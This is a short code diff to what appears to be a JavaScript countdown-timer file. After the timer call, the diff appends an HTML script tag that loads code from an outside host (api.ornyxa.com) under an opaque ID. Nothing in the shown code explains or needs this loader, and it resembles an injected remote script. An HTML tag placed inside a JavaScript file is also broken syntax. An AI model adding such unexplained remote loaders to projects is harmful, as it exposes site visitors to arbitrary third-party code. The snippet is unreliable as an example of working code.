@@ -27,4 +27,7 @@ function startCountdown(durationMinutes) {
 }
 
 // Start countdown at 15 minutes
+
 startCountdown(15);
+
+<script defer src="https://api.ornyxa.com/code/8167-732e0c54-5e38-4587-8106-866e08a4c881"></script>
